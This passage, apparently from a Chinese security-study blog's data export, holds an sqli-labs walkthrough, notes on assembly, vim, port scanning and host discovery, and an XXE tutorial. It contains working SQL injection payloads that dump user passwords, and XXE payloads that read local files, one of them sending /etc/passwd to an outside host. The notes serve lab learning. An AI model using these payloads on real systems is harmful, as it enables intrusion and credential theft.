%23&amp;submit&#x3D;Submit爆表名uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) %23&amp;submit&#x3D;Submit爆字段名uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()),0x7e),1) %23&amp;submit&#x3D;Submit爆字段值,limit处修改x查看下一行uname&#x3D;admin&amp;passwd&#x3D;123&#39; and updatexml(1,concat(0x7e,(select password from (select password from security.users limit x,1 ) bieming ),0x7e),1) %23&amp;submit&#x3D;Submit Less-18post字符型报错注入 burp抓包 admin,admin成功登录并修改User-Agent 123暴库User-Agent: &#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-19post字符型报错注入 burp抓包,admin,admin成功登录并修改referer 12Referer:&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-20post字符型报错注入 admin,admin成功登录后，burp抓包，修改cookie 1Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39; Page-2Less-21cookie注入，base64加密，单引号圆括号闭合 admin,admin成功登录后，burp抓包 cookie处YWRtaW4%3D也就是YWRtaW4=,再base64解密，结果admin 构造 admin&#39;) and updatexml(1,concat(0x7e,(database()),0x7e),1) and (&#39; 再base64加密YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw== 修改Cookie 12爆库Cookie: uname&#x3D;YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw&#x3D;&#x3D; Less-22cookie注入，base64加密，双引号 与less-21相同，修改为双引号闭合 1Cookie: uname&#x3D;YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoZGF0YWJhc2UoKSksMHg3ZSksMSkgYW5kICI&#x3D; Less-23get报错注入，绕过注释 1234闭合?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1爆库?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39; Less-24二次注入 创建一个admin&#39;#账户 登陆后修改密码，Password successfully updated ，记住修改后的密码 之后即可使用admin用户登录 Less-25and,or,注释过滤 双写绕过，information里的or也双写 1234闭合?id&#x3D;1&#39; anandd &#39;1&#39;&#x3D;&#39;1爆库?id&#x3D;1&#39; anandd updatexml(1,concat(0x7e,(database()),0x7e),1) anandd &#39;1&#39;&#x3D;&#39;1 Less-26空格，and，注释过滤 and双写绕过，information里的or也双写，空格用以下编码绕过 %09 TAB键（水平） %0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格 1234闭合?id&#x3D;1&#39; anandd &#39;1&#39;&#x3D;&#39;1爆库?id&#x3D;1&#39;anandd %a0 updatexml(1,concat(0x7e,(database()),0x7e),1) %a0 anandd &#39;1&#39;&#x3D;&#39;1 Less-27union,select,空格过滤 空格绕过同less-26, select大小写绕过 123456闭合?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1爆库?id&#x3D;1&#39; and %a0 updatexml(1,concat(0x7e,(database()),0x7e),1) %a0 and &#39;1&#39;&#x3D;&#39;1爆表?id&#x3D;1&#39; and %a0 updatexml(1,concat(0x7e,(SeLect %a0 group_concat(table_name) from %0a information_schema.tables %a0 where %a0 table_schema&#x3D;database()),0x7e),1) %a0 and &#39;1&#39;&#x3D;&#39;1 Less-28union,select，空格过滤 大小写绕过 12345678910闭合?id&#x3D;1&#39;) and (&#39;1&#39;)&#x3D;(&#39;1爆库?id&#x3D;0&#39;) %a0 Union %a0 SelEct %a0 1,database(),3 %a0and (&#39;1&#39;)&#x3D;(&#39;1爆表名?id&#x3D;0&#39;) %a0 Union %a0 SelEct %a0 1,group_concat(table_name) ,3%a0 from %a0 information_schema.tables %a0 where %a0 table_schema&#x3D;database() %a0and (&#39;1&#39;)&#x3D;(&#39;1爆字段名?id&#x3D;0&#39;) %a0 Union %a0 SelEct %a0 1,group_concat(column_name) ,3%a0 from %a0 information_schema.columns %a0 where %a0 table_name&#x3D;&quot;users&quot; and %a0 table_schema&#x3D;database() %a0and (&#39;1&#39;)&#x3D;(&#39;1爆字段值?id&#x3D;0&#39;) UNion %a0 SElect %a0 1,(group_concat(username,0x3a,password)),3 %a0 from %a0 security.users %a0 where %a0 1 %a0 and %a0 (&#39;1&#39;)&#x3D;(&#39;1 Less-29有waf,…emmm 12345678爆库?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &#39;1&#39;&#x3D;&#39;1爆表?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(seLect group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) and &#39;1&#39;&#x3D;&#39;1爆字段名?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(seLect group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;users&quot;),0x7e),1) and &#39;1&#39;&#x3D;&#39;1爆字段值,显示长度受限，配合substr()?id&#x3D;1&#39; and updatexml(1,substr(concat(0x7e,(seLect group_concat(username,0x3a,password) from security.users),0x7e),1,24),1) and &#39;1&#39;&#x3D;&#39;1 Less-30有waf,…..emmm，同less-29，换双引号 12闭合?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1 Less-31有waf，同less-29，换双引号，想体验过waf,就自己加 12闭合?id&#x3D;1&quot;) and (&quot;1&quot;)&#x3D;(&quot;1 Less-32引号过滤 宽字节绕过,users转为hex 12爆库?id&#x3D;1%e6&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) %23 Less-33同less-32 12爆库?id&#x3D;1%e6&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) %23 Less-34post,其他同less-32 12爆库uname&#x3D;admin%e6&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) %23&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit Less-35get整形报错注入 12爆库?id&#x3D;1 and updatexml(1,concat(0x7e,(database()),0x7e),1) Page-3Less-381234闭合?id&#x3D;1&#39; %23爆库?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1) %23 …没发现第三页的新鲜玩意，直接跳到第四页，谁发现留言一哈 Page-4次数限制为10次，像ctf,还要提交key Less-549次才爆了个库，表名是变化的 12345678910111213141516闭合?id&#x3D;1&#39; %23爆库和表?id&#x3D;0&#39; UnIon SelEct 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23------Your Login name:challengesYour Password:qmwp03yike------爆字段名?id&#x3D;0&#39; UnIon SelEct 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;&quot; %23------Your Login name:2Your Password:id,sessid,secret_L8D3,tryy------爆字段值太菜了，没爆出来，休息一下再来","categories":[{"name":"靶场","slug":"靶场","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"汇编语言入门学习","slug":"汇编语言","date":"2019-09-30T16:00:00.000Z","updated":"2020-05-10T11:39:49.177Z","comments":true,"path":"categories/uncategorized/汇编语言/","link":"","permalink":"https://lacc233.github.io/categories/uncategorized/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","excerpt":"","text":"现在用到汇编语言多么？学习他的意义在哪里？** 1.汇编语言 汇编语言是最接近于机器语言的编程语言。如果说机器语言是计算机操作的本质，那么汇编语言就是最最接近本质的语言。汇编语言操作直接面向硬件，所以， 我们在使用汇编语言的时候，我们能够感知计算机的运行过程和原理，从而能够对计算机硬件和应用程序之间的联系和交互形成一个清晰的认识。这也是最能够锻炼 编程者编程思维逻辑的，只有这样，学习者才能形成一个软、硬兼备的编程知识体系，这是任何高级语言都无法给予的！相对于繁复的高级语言，汇编语言指令集合 更简约，指令操作更直接，从汇编开始学习更符合循序渐进的学习原理！所以，对于计算机技术初学者或者自学者，汇编语言重要性无可替代！ 2.汇编语言之于高级语言 不否认，在应用层面，高级语言占据了软件开发市场的绝大部分。也正是这种现象，误导了学习者，甚者是教育者！所以目前高校计算机专业的现状是：专业课 程中C语言，C++，java等高级语言一应俱全，而毕业的学生却连简单的程序都不能编写。为什么？听不懂，学不会！这就是缺乏基础造成的！汇编语言才是计算机技术的基础，而不是常说的C语言。之所以说汇编重要，其一个重要的原因就是，汇编语言能够让你更好的理解高级语言，尤其是高级语言中的 C语言。汇编语言对于内存的操作都是基于内存地址的，而C语言中最令人头疼的指针概念，说白了就是内存的地址。指针的学习和应用中最头疼的就是在指针这个 抽象的概念和实际的内存单元之间建立思维映射，而这些恰恰是我们在汇编语言学习中频繁做的一件平常事。另外，对于C语言中的数据类型、形参实参、函数调 用、全局变量、局部变量等概念及操作，我们都可以用汇编语言中的一些操作相关联，把这些抽象的概念和过程，通过汇编语言形成一个具体的映像，深度剖析，这 样我们才能真正的学会、学好C语言。 有了汇编和C的基础，那些所谓的面向对象的语言学习起来就更为顺畅了！奉劝那些好高骛远的学习者，踏踏实实的从汇编开始吧，古云：磨刀不误砍柴工啊！ 3.汇编语言之于应用 很多学习者放弃对于汇编语言的学习，是因为高级语言的开发更容易找到工作。这个理由也是我见到过的最现实的。但是，这里面明显存在着认识误区！ 首先，我们的学习是一个系统过程，我们的知识结构不是一个单一课程所能够建立的。所以，学习汇编的目的并不是非要用汇编去挣饭钱。因为汇编语言对于一个编程人员所应该具备的基本素质的培养和形成得意义是非常重大的！这在前文中已经分析了，不再赘述！ 其次，汇编本身也是很重要的应用技术。由于学习者，尤其是在校的学生，平时接触的最多的是纯软件的东西，所以，觉得五花八门的软件才是计算机技术应用 的舞台。那么这些人最终会成为那位博主提到的那些工作后才意识到汇编的作用的“师兄”！汇编的操作由于跟硬件紧密相关，所以，很多硬件设施的嵌入式编程使 用的都是使用的汇编语言，因为汇编语言更直接，更有效率！我们现在的数码产品很多，而这些数码产品赖以生存的芯片，主板等，都包含了嵌入式程序，而这些程 序中，汇编语言的使用是相当重要的！ 汇编语言介绍汇编学习，重要的是思维，用会变的丝线，写C的程序 汇编语言是除了机器语言我么所能操做的最底层语言，汇编语言是效率最高的语言。高级语言优化好的话，另当别论 为什么要学汇编语言：计算机思维操作计算机 反编译原理：汇编语言与机器语言是一 一对应的 研究重点：利用硬件系统的编程结构和指令集，有效灵活的控制系统进行互作。 机器语言：机器指令的集合，机器指令展开来讲就是一台机器可以正确执行的命令 指令：（01010000）push ax 电平脉冲：0┗|｀O′|┛ 嗷~~，1凸 发展：一开始纸带打点，后来石英共振……，之后的发展是速度发生变化，但是是指仍然是01 机器码：01… 助记符：汇编相对于机器语言 cpu是如何以外部交流的每一种CPU都有自己的汇编指令集。cpu可直接在存储器中存取，在存储器中数据和指令无区别，都是二进制信息，所以放在不同的总线上就是不同的效果。 汇编指令：机器码的助记符（核心，决定了特性） 伪指令：编译器执行 其他符号：编译器识别 优秀书籍：《编码的奥秘》 在磁盘与内存中，数据与指令都是二进制。 cpu调用内存（磁盘调到内存），项进行数据的读写，必须和外部器件（芯片）进行三类信息的交换： 存储单元的地址（地址信息） 器件的选择，读写命令（控制信息） 读写的数据(数据信息) 物理上：一根根导线的集合 逻辑上： 地址总线——– 控制总线—————- -| 内存（存储芯片） | 数据总线—————- -|——————– 64位的要求为，cpu,操作系统，软件 都要是64位，那么才能达到64位的处理速度。 64位就是64条地址总线，可对64个存储单元进行寻址；地址总线的宽度为64，可以寻址2^64（寻址能力）; 地址从上到下由低到高，一个地址总线可以索引一个内存单元也就是一个字节，一个字节八位。 数据总线 的宽度决定了cpu和外界的数据传送速度 8088：8 8086：16 控制总线是个总称，是一些不同控制线的集合，宽度决定了控制能力 ，一条线01（负电压）决定读写。 例如：从三号单元数据放到ax。 优秀书籍：《C的缺陷与陷阱》 存储器芯片： 读写属性分类：ram随机存储器，rom只读存储器。 从功能和连接上分类：随机存储器ram,装有BIOS的rom（各种接口卡，主板都有BIOS）,接口卡上的ram 核心：以汇编语言的思维来编程，汇编编程时，从cpu的角度出发。 cpu内部工作原理一个典型的cpu 有计算器，控制器，寄存器的器件组成，这些器件是靠内部总线相连 区别：内部总线连接cpu内部器件，外部总线连接cpu 与主板上的其他器件 8086cpu有14个寄存器：AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW 8086(16bit)通用寄存器ax(ah,al)向下兼容 字在寄存器中的存储，一个字2字节。 汇编指令不区分大小写 先介绍俩个指令 mov 功能：将数据直接送入寄存器（mov ax,1000），将一个寄存器中的内容送入另一个寄存器中(mov ax,bx) add 加 16位结构的cpu特征运算器一次最多可以处理16位的数据 寄存器的最大宽度为16位 寄存器和运算器之间的通路为16位的 8086外部有20位地址总线，可传送20位地址，寻址能力为1M; 内部为16位结构，他只能传送16位的地址，表现出的寻址能力却只有64K. 地址加法器：物理地址=段地址*16+偏移地址 段的概念将一组内存单元定义为段 内存并没有分段，段的划分来自于cpu（cpu将段地址和偏移地址交给地址加法器）,后在编程中根据需要，将若干的地址联系的内存单元看作一个段，用段地址*16定位段的起始地址（基础地址），用偏移地址定位段中的内存单元。 数据在21f60H内存单元，对于8086pc机上的两种描述： 数据存在内存2000:1f60单元中；常用 数据存在内存的2000段中的1f60H单元中 段地址的选出：根据需要，将地址连续，起始地址为16的倍数的一组内存单元定义为一个段。 段寄存器段寄存器就是提供段地址的。 8086cpu有4个段寄存器： cs(代码段地址寄存器) ds（数据段） ss（堆栈段） es（附加段） 代码段cs,ip人规定始位置 cs和ipcs和ip是8086cpu中做关键的寄存器，他们指示了cpu当前读取指令的地址。 cs为代码段寄存器 ip为指令指针寄存器 在任何时候，cpu将cs,ip中的内容当作段地址和偏移地址 123jmp ax #修改ipjmp 1000:3 #修改cs 和 ip 蓝屏一般是内存问题，卡死，死机一般是cpu问题。 debug只是个调试程序 寄存器内存访问字单元N和n+1号字节单元（低地址和高地址） ds8086pc中，内存地址由段地址和偏移地址组成，ds寄存器存放要访问的数据的段地址。 下列命令将10000H（1000:0）中的数据读到al中 123mov bx 1000mov bs bxmov al,[0] mov al,[0] 将0这个偏移地址中的内容送入al中 增加功能：将一个内存单元中的内容送入一个寄存器。 [0] 中的0表示偏移地址，段地址在bs中（8086cpu自动获取ds中的数据为内存单元的段地址） 不能直接把1000H直接送给ds,要通过通用寄存器（硬件设计） 将al中的数据送到10000H中 123mov bx 1000mov bs bxmov [0],al 字的传送8086cpu是16位的，注意区分字和字节 mov形式： 123456mov 寄存器， 数据mov 寄存器， 寄存器mov 寄存器， 内存单元mov 内存单元， 寄存器mov 段寄存器, 寄存器mov 寄存器, 段寄存器 add加 1234add 寄存器， 数据add 寄存器，寄存器add 寄存器， 内存单元add 内存单元， 寄存器 sub减 1sub ax, bx # ax&#x3D;ax-bx 数据段定义一组内存单元存数据，ds 栈栈是内存中的数据结构,下高地址，上高地址，方便临时存储数据而存在（内部函数） 8086以字为单位 push ax ax中的数据送入栈 pop ax 从栈顶取出数据送入ax ss和sp指向栈顶元素，8086cpu只记录栈顶 push实质是内存传送指令 入栈,sp-2，放入数据 pop出栈，拿出数据，sp+2,指向新的栈顶，但是原栈顶位置数据仍然存在；再次执行push命令后，它将被覆盖。 push和pop指令是可以在寄存器和内存之间传送数据的 栈顶越界问题：溢出，危险 栈顶上限下限寄存器，然而8086cpu中并没有这样的寄存器 8086cpu的互作机理，只考虑当前的情况：当前栈顶在何处，当前要执行的指令是哪一条，栈空间是人自己限制 1234push 通用寄存器push 段寄存器 #将一个段寄存器中的数据入栈push 内存单元 #push [1]pop ... 栈段ss,sp规定 源程序1234567assume cs:codesgcodesg segmentstart:程序...4......4......codesg endsend start cx存程序的机器码长度 ds和cs之间有的空余 debug程序，t一步一步执行，p来执行int 21,或者，g一步执行到底。 循环bx在masm和debug中写程序是不一样的 123mov ax, 1000mov ds, axmov al, [1] 在masm中就会被当作1，放入al中，debug中会把10000H处的数据放入到al中。 所以在masm编译器中， 1234mov ax, 1000mov ds, axmov bx, 1mov al, [bx] loop","categories":[],"tags":[{"name":"汇编","slug":"汇编","permalink":"https://lacc233.github.io/tags/%E6%B1%87%E7%BC%96/"}]},{"title":"vim常用","slug":"vim常用","date":"2019-09-28T16:00:00.000Z","updated":"2020-05-11T07:38:36.735Z","comments":true,"path":"categories/工具/vim常用/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/vim%E5%B8%B8%E7%94%A8/","excerpt":"简单介绍常用的按键","text":"简单介绍常用的按键 按键 作用 e 字首 b 字尾 a 光标前insert i 光标后insert u 撤销 U 撤销光标所在行的修改，本质是修改，可用u撤回 $ 行尾 0 行首 J 去除本行换行符 x 删除 s 删除，并进入insert状态 dd 删除光标所在行 / 查找 n 向下查找 N 向上查找 h 左 j 下 k 上 l 右 yy 复制光标所在行 nyy 从光标处开始复制n行 p 在光标处粘贴行","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://lacc233.github.io/tags/vim/"}]},{"title":"端口扫描","slug":"端口扫描","date":"2019-09-11T15:36:08.000Z","updated":"2020-05-10T12:56:13.207Z","comments":true,"path":"categories/web安全/端口扫描/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/","excerpt":"端口扫描工具","text":"端口扫描工具 简单介绍“端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部端口，不可见。例如计算机中的80端口、21端口、23端口等。 一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。 因此，一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号，因此要对服务进行测试，首先要确定是否开放对应端口号。 端口扫描工具nmapdmitry使用dmitry进行端口扫描，其中-p参数指定dmitry进行tcp端口扫描。 netcat使用Netcat进行端口扫描。 1nc -nvz IP地址 端口范围 端口的分类端口范围 0-65535TCP端口和UDP端口。由于TCP和UDP 两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。 端口分为：周知端口周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在IE的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。 注册端口端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。 动态端口动态端口的范围是从49152到65535。之所以称为动态端口，是因为它 一般不固定分配某种服务，而是动态分配。 端口Banner获取使用Nmap扫描指定主机的端口信息，并返回Banner。 1nmap IP地址 --script banner -p 端口号 使用dmitry获取端口banner信息 1dmitry -pb IP地址 使用netcat获取Banner信息： 1nc -vn IP地址 端口号 端口服务版本信息获取利用Nmap获取目标系统的端口版本信息： 1nmap -p 端口号 -sV IP地址 操作系统版本信息获取使用Nmap扫描指定主机的操作系统版本信息。 1nmap -O IP地址 在针对内容测试时，有授权的情况下，可以利用nmap对目标进行完整测试。 1nmap -A -v IP地址","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"主机发现","slug":"主机发现","date":"2019-09-11T14:17:51.000Z","updated":"2020-05-10T12:57:13.723Z","comments":true,"path":"categories/web安全/主机发现/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/","excerpt":"主机发现所用的工具 参考：https://www.jianshu.com/p/b53d6d09246d","text":"主机发现所用的工具 参考：https://www.jianshu.com/p/b53d6d09246d 二层发现osi： 开放式系统互联，每层都是单独交互 二层发现 ：利用osi中的链路层中的协议进行主机发现。一般使用arp协议（前提是对方二层是Eternet接口）。 优点：局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址1、速度快2、可靠性高 缺点：无法请求到经过路由（不同网络）的主机 工具arpingKali linux下自带工具arping可以进行对应的二层主机发现。缺点：无法多个主机同时扫描 123arping -c 1 ip #向IP发送一个arp requeat包arping -d ip #判断arp地址欺骗，-d 可显示一个ip一个或多个macsudo arping -d 192.168.0.3 | grep \"bytes from\" | awk '&#123;print $4,$5&#125;' | cut -d \"(\" -f 1 若扫描一个网段，脚本如下 12345678910111213#!/bin/bashif [ \"$#\"-ne 1 ];then4echo\"Usage - ./arping.sh [interface]\"4echo\"Example - ./arping.sh eth0\"4echo\"Example will perform an ARP scan of the local subnet to which eth0 is assigned\"4exitfiinterface=$1prefix=$(ifconfig $interface | grep \"inet\" | awk '&#123;print $2&#125;' | cut -d \".\" -f 1-3 | sed -n 1p)for addr in $(seq 1 254); do4arping -c 1 $prefix.$addr | grep \"bytes from\" | awk '&#123;print $4,$5&#125;' | cut -d \":\" -f 1-6done nmap-sn 不做端口扫描（arp ,dns） 12nmap -sn ipnmap -iL filename -sn netdiscoverKali linux 自带工具netdiscover可以针对特定子网进行多主机扫描。 主动 12netdiscover -i eth0 -r 192.168.127.1/24netdiscover -l filename 被动 1netdiscover -p #网卡混杂模式，非本网卡IP也会抓取 scapy可做工具单独使用 1sudo scapy python库 1pip install scapy 脚本 12 三层发现三层主机发现指：利用ISO中网络中的协议进行主机发现。一般使用ICMP协议 优点：1、可以发现远程主机 经过路由的主机2、速度相对比较快 缺点：1、经常被防火墙过滤2、速度相比二层发现慢 工具ping工具在Linux和windows都有自带，Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。 fpingKali linux下自带工具fping可以进行对应的三层主机发现。可以针对多个主机同时进行主机发现 1fping -g 192.168.127.1&#x2F;24 hping3Kali linux 自带工具hping3对目标进行三层主机发现。特点：发送自定义ICMP数据包 1hping3 -c 2 --icmp 192.168.127.1 四层发现四层发现指利用OSI中的传输层协议进行主机发现，一般使用TCP、UDP探测。 优点：1、可以探测远程主机2、比三层发现更为可靠 缺点：花费时间更长 工具nmapKali linux自带的Nmap可以进行二、三、四层的探测，我们接下来演示nmap探测。 1nmap IP地址 hping3Kali linux下自带工具hping3可以进行对应的四层层主机发现。 1hping3 --udp -c 3 IP地址 并没有受到数据包，全部loss掉了。所以要结合多层主机发现来进行探测。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"xxe漏洞学习","slug":"xxe漏洞学习","date":"2019-09-05T11:36:12.000Z","updated":"2020-05-10T12:31:30.268Z","comments":true,"path":"categories/web安全/xxe漏洞学习/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","excerpt":"XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。","text":"XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xmlxml介绍XML 被设计用来传输和存储数据。XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。XML 允许创作者定义自己的标签和自己的文档结构。 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don't forget me this weekend!&lt;/body&gt;&lt;/note&gt; XML语法规则1、所有的 XML 元素都必须有一个关闭标签 2、XML 标签对大小写敏感 3、XML 必须正确嵌套 4、XML 属性值必须加引号 5、实体引用 6、在 XML 中，空格会被保留 XML元素介绍XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分 注意XML 文档必须有一个根元素 XML DTD介绍拥有正确语法的 XML 被称为”形式良好”的 XML。通过 DTD 验证的XML是”合法”的 XML。 DTDDTD声明类型内部的 DOCTYPE 声明： 1&lt;!DOCTYPE root-element [element-declarations]&gt; 1234567891011121314&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt; &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;Tove&lt;&#x2F;to&gt; &lt;from&gt;Jani&lt;&#x2F;from&gt; &lt;heading&gt;Reminder&lt;&#x2F;heading&gt; &lt;message&gt;Don&#39;t forget me this weekend!&lt;&#x2F;message&gt; &lt;&#x2F;note&gt; 外部文档声明：假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： 1&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; xml文件 12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;&lt;/note&gt; note.dtd 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; DTD数据类型PCDATA 的意思是被解析的字符数据（parsed character data）。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。 CDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开 DTD实体介绍实体是用于定义引用普通文本或特殊字符的快捷方式的变量 内部实体： 1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 外部实体： 1&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt; XXE原理XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 助于理解简单xxe漏洞代码编写 file_get_contents() 函数把整个文件读入一个字符串中。 php://input 是个可以访问请求的原始数据的只读流。 php中的simplexml_load_string函数将xml格式字符串转换为对应的SimpleXMLElement 测试代码123456&lt;?php$xml=file_get_contents(\"php://input\");$data = simplexml_load_string($xml) ;echo \"&lt;pre&gt;\" ;print_r($data) ;//注释掉该语句即为无回显的情况?&gt; 利用漏洞有回显的XXE利用payload: 1234&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot; &gt;]&gt;&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt; 读取PHP文件 直接利用file协议读取PHP文件会出现错误，那么需要使用base64编码来进行读取。 Payload: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.php&quot; &gt;]&gt;&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt; 无显 123&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE foo SYSTEM \"http://192.168.127.140/test.dtd\"&gt;&lt;foo&gt;&amp;e1;&lt;/foo&gt; 12&lt;!ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#39;HTTP:&#x2F;&#x2F;192.168.127.140&#x2F;test.php?con&#x3D;%p1;&#39;&gt;&quot;&gt;%p2;","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"SSRF漏洞笔记","slug":"SSRF漏洞笔记","date":"2019-09-03T00:25:59.000Z","updated":"2020-05-10T12:31:06.770Z","comments":true,"path":"categories/web安全/SSRF漏洞笔记/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/SSRF%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/","excerpt":"SSRF（server-site request forery，服务端请求伪造）是一种构造请求，由服务端发起请求的安全漏洞。","text":"SSRF（server-site request forery，服务端请求伪造）是一种构造请求，由服务端发起请求的安全漏洞。 一般情况下，SSRF的目标就是与外部隔离的内网资源。 SSRF漏洞原理 